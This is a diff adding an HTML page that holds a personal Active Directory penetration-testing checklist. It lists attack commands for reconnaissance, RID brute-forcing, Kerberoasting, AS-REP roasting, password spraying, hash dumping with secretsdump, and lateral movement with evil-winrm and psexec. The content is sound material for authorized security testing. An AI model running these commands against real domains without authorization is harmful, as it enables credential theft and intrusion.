@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory Pentest Checklist</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: "Consolas", monospace;
+        background: #0f1117;
+        color: #e6edf3;
+    }
+
+    header {
+        background: linear-gradient(90deg,#00f7ff,#00c3ff);
+        padding: 20px;
+        text-align: center;
+        color: #000;
+        font-size: 24px;
+        font-weight: bold;
+        letter-spacing: 2px;
+    }
+
+    .container {
+        padding: 30px;
+        max-width: 1200px;
+        margin: auto;
+    }
+
+    h2 {
+        color: #00f7ff;
+        border-left: 5px solid #00f7ff;
+        padding-left: 10px;
+        margin-top: 40px;
+    }
+
+    .card {
+        background: #161b22;
+        padding: 20px;
+        border-radius: 10px;
+        margin-top: 15px;
+        box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
+        transition: 0.3s;
+    }
+
+    .card:hover {
+        box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+    }
+
+    code {
+        display: block;
+        background: #0d1117;
+        padding: 10px;
+        margin-top: 10px;
+        border-radius: 5px;
+        color: #00ff99;
+        overflow-x: auto;
+    }
+
+    input[type="checkbox"] {
+        transform: scale(1.2);
+        margin-right: 8px;
+    }
+
+    footer {
+        text-align: center;
+        padding: 20px;
+        margin-top: 50px;
+        font-size: 12px;
+        color: #888;
+    }
+</style>
+</head>
+
+<body>
+
+<header>
+🧠 ACTIVE DIRECTORY PENTEST MASTER CHECKLIST
+</header>
+
+<div class="container">
+
+<h2>1️⃣ Initial Recon</h2>
+<div class="card">
+<label><input type="checkbox"> Scan All Ports</label>
+<code>nmap -p- -T4 -v TARGET_IP</code>
+
+<label><input type="checkbox"> Service Detection</label>
+<code>nmap -sC -sV TARGET_IP</code>
+
+<label><input type="checkbox"> UDP Top Ports</label>
+<code>nmap -sU --top-ports 50 TARGET_IP</code>
+</div>
+
+<h2>2️⃣ SMB & LDAP Enumeration</h2>
+<div class="card">
+<label><input type="checkbox"> Anonymous SMB Check</label>
+<code>smbclient -L //TARGET_IP -N</code>
+
+<label><input type="checkbox"> RID Bruteforce</label>
+<code>crackmapexec smb TARGET_IP --rid-brute</code>
+
+<label><input type="checkbox"> LDAP Search</label>
+<code>ldapsearch -x -H ldap://TARGET_IP -b "dc=domain,dc=local"</code>
+</div>
+
+<h2>3️⃣ User Attacks</h2>
+<div class="card">
+<label><input type="checkbox"> AS-REP Roasting</label>
+<code>impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass</code>
+
+<label><input type="checkbox"> Kerberoasting</label>
+<code>impacket-GetUserSPNs domain.local/user:pass -request</code>
+</div>
+
+<h2>4️⃣ Credential Spraying</h2>
+<div class="card">
+<label><input type="checkbox"> Password Spray</label>
+<code>crackmapexec smb TARGET_IP -u users.txt -p Password123</code>
+</div>
+
+<h2>5️⃣ BloodHound Collection</h2>
+<div class="card">
+<label><input type="checkbox"> Collect Data</label>
+<code>bloodhound-python -u user -p pass -d domain.local -c all</code>
+</div>
+
+<h2>6️⃣ Privilege Escalation</h2>
+<div class="card">
+<label><input type="checkbox"> User Info</label>
+<code>whoami /all</code>
+
+<label><input type="checkbox"> Run WinPEAS</label>
+<code>.\winPEASx64.exe</code>
+</div>
+
+<h2>7️⃣ Dumping Hashes</h2>
+<div class="card">
+<label><input type="checkbox"> Dump Hashes</label>
+<code>secretsdump.py domain.local/user:pass@TARGET_IP</code>
+</div>
+
+<h2>8️⃣ Lateral Movement</h2>
+<div class="card">
+<label><input type="checkbox"> Evil-WinRM</label>
+<code>evil-winrm -i TARGET_IP -u user -p pass</code>
+
+<label><input type="checkbox"> PsExec</label>
+<code>psexec.py domain.local/user:pass@TARGET_IP</code>
+</div>
+
+<h2>9️⃣ Pivoting</h2>
+<div class="card">
+<label><input type="checkbox"> SSH Port Forward</label>
+<code>ssh -L 8080:192.168.2.10:80 user@pivot</code>
+</div>
+
+</div>
+
+<footer>
+🔥 Personal AD Pentest Checklist | For Authorized Testing Only
+</footer>
+
+</body>
+</html>
